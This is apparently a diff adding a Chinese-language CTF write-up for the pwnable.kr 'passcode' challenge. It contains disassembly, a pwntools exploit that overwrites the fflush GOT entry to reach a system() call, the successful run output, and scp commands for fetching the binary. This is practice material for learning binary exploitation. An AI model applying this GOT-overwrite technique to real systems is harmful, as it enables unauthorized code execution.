+ 80485a5:    b8 83 87 04 08           mov    $0x8048783,%eax
+ 80485aa:    8b 55 f4                 mov    -0xc(%ebp),%edx
+ 80485ad:    89 54 24 04              mov    %edx,0x4(%esp)
+ 80485b1:    89 04 24                 mov    %eax,(%esp)
+ 80485b4:    e8 e7 fe ff ff           call   80484a0 &lt;__isoc99_scanf@plt&gt;
+ 80485b9:    c7 04 24 99 87 04 08     movl   $0x8048799,(%esp)
+ 80485c0:    e8 8b fe ff ff           call   8048450 &lt;puts@plt&gt;
+ 80485c5:    81 7d f0 e6 28 05 00     cmpl   $0x528e6,-0x10(%ebp)
+ 80485cc:    75 23                    jne    80485f1 &lt;login+0x8d&gt;
+ 80485ce:    81 7d f4 c9 07 cc 00     cmpl   $0xcc07c9,-0xc(%ebp)
+ 80485d5:    75 1a                    jne    80485f1 &lt;login+0x8d&gt;
+ 80485d7:    c7 04 24 a5 87 04 08     movl   $0x80487a5,(%esp)
+ 80485de:    e8 6d fe ff ff           call   8048450 &lt;puts@plt&gt;
+ 80485e3:    c7 04 24 af 87 04 08     movl   $0x80487af,(%esp)
+ 80485ea:    e8 71 fe ff ff           call   8048460 &lt;system@plt&gt;
+ 80485ef:    c9                       leave  
+ 80485f0:    c3                       ret    
+ 80485f1:    c7 04 24 bd 87 04 08     movl   $0x80487bd,(%esp)
+ 80485f8:    e8 53 fe ff ff           call   8048450 &lt;puts@plt&gt;
+ 80485fd:    c7 04 24 00 00 00 00     movl   $0x0,(%esp)
+ 8048604:    e8 77 fe ff ff           call   8048480 &lt;exit@plt&gt;
+</code></pre><p>说干就干，来构造下EXP</p>
+<pre><code>#!/usr/bin/env python
+import pwn
+
+ssh = pwn.ssh(host=&#39;pwnable.kr&#39;, user=&#39;passcode&#39;, password=&#39;guest&#39;, port=2222)
+attack = ssh.process(executable=&#39;./passcode&#39;)
+
+got_fflush = 0x0804a004
+addr_before_sys = &#39;134514147&#39;
+
+payload = 96 * &#39;a&#39;
+payload += pwn.p32(got_fflush)
+payload += addr_before_sys
+
+print attack.recv()
+attack.sendline(payload)
+flag = attack.recvall()
+print flag
+</code></pre><p>打一波</p>
+<pre><code>wnagzihxain@toT0C:~$ python Exp.py 
+[!] Pwntools does not support 32-bit Python.  Use a 64-bit release.
+[+] Connecting to pwnable.kr on port 2222: Done
+[*] passcode@pwnable.kr:
+    Distro    Ubuntu 16.04
+    OS:       linux
+    Arch:     amd64
+    Version:  4.10.0
+    ASLR:     Enabled
+[+] Starting remote process &#39;./passcode&#39; on pwnable.kr: pid 50350
+Toddler&#39;s Secure Login System 1.0 beta.
+enter you name : 
+[+] Receiving all data: Done (231B)
+[*] Stopped remote process &#39;passcode&#39; on pwnable.kr (pid 50350)
+Welcome aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x04\xa0\x0!
+Sorry mom.. I got confused about scanf usage :(
+enter passcode1 : Now I can safely trust you that you have credential :)
+</code></pre><p>Flag</p>
+<pre><code>Sorry mom.. I got confused about scanf usage :(
+</code></pre><p>小补充，如果不想在服务器上调试的，可以通过下面的操作来拷贝服务器上编译好的二进制文件，ip可以自己ping一下</p>
+<pre><code>wnagzihxain@toT0C:~$ scp -P 2222 passcode@143.248.249.64:/home/passcode/passcode.c /home/wnagzihxain/
+passcode@143.248.249.64&#39;s password: 
+passcode.c                                                                           100%  858     0.8KB/s   00:00    
+wnagzihxain@toT0C:~$ scp -P 2222 passcode@143.248.249.64:/home/passcode/passcode /home/wnagzihxain/
+passcode@143.248.249.64&#39;s password: 
+passcode                                                                             100% 7485     7.3KB/s   00:00    
+wnagzihxain@toT0C:~$ scp -P 2222 passcode@143.248.249.64:/home/passcode/flag /home/wnagzihxain/
+passcode@143.248.249.64&#39;s password: 
+scp: /home/passcode/flag: Permission denied
+</code></pre><p>不要在意我下载Flag被拒，可以说是很窒息的操作了</p>
+
+</body>
+</html>
+<!-- This document was created with MarkdownPad, the Markdown editor for Windows (http://markdownpad.com) -->
